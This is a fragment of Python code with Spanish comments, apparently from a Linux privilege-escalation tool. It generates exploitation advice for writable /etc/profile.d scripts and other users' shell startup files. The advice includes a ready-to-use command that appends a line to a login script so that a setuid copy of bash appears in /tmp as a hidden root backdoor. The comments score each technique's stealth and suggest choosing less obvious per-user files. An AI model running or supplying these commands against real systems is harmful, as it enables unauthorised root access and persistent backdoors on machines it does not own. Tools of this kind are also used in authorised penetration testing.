    if profile_d:
        # /etc/profile.d/* afecta a TODOS los usuarios al hacer login
        # Reliability=5, stealth=2 (script extra es notable), speed=1 (esperar login)
        rel, stl, spd = 5, 2, 1
        score, tier = gtfobins.score_technique(rel, stl, spd)
        first = profile_d[0].data.get('path', '?')
        out.append({
            'title':         f"/etc/profile.d/* escribible ({len(profile_d)} archivos)",
            'severity':      'critical',
            'technique': {
                'verify':  f'ls -la {first}; who  # ver usuarios con sesiones activas',
                'exploit': f"echo 'cp /bin/bash /tmp/.b && chmod u+s /tmp/.b' >> {first}",
                'why':     '/etc/profile.d/* se carga en cada login interactivo (incluido root)',
                'success': 'al próximo login de root o cualquier user con sesión nueva, /tmp/.b -p da shell',
                'notes':   'Espera puede ser larga si nadie hace login nuevo — combinar con who para timing',
                'ref':     'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profile-files',
            },
            'extra_context': f"Primer archivo: {first}",
            'tier': tier, 'score': score,
            'reliability': rel, 'stealth': stl, 'speed': spd,
            'kind': 'special',
        })

    if shell_rc:
        # .bashrc/.zshrc de otro usuario — escalada al login de ese usuario específico
        # Reliability=4, stealth=3, speed=1 (esperar login del usuario)
        rel, stl, spd = 4, 3, 1
        score, tier = gtfobins.score_technique(rel, stl, spd)
        # Listar hasta 3 paths/owners
        targets = []
        for srf in shell_rc[:3]:
            scope = srf.data.get('scope', '')
            owner = srf.data.get('owner', '')
            label = owner if owner else (scope or '?')
            targets.append(f"{srf.data.get('path', '?')} ({label})")
        # Para el verify/exploit usar preferentemente un .bashrc de usuario, no global
        # (los globales son más obvios). Buscamos el primer scope='user'.
        chosen = None
        for srf in shell_rc:
            if srf.data.get('scope') == 'user':
                chosen = srf
                break
        if chosen is None:
            chosen = shell_rc[0]
        chosen_path = chosen.data.get('path', '?')
        chosen_owner = chosen.data.get('owner', '')
        chosen_scope = chosen.data.get('scope', '')

        # Construir verify según si es global o por user
        if chosen_owner:
            verify_cmd = f'ls -la {chosen_path}; last -n 5 {chosen_owner}    # ver actividad del user'
            success_msg = f'al próximo login de {chosen_owner}, /tmp/.b -p da shell con privilegios de {chosen_owner}'
        else:
            verify_cmd = f'ls -la {chosen_path}; who    # ver usuarios con sesiones activas'
            success_msg = 'al próximo login de cualquier usuario afectado, /tmp/.b -p da shell'

        out.append({
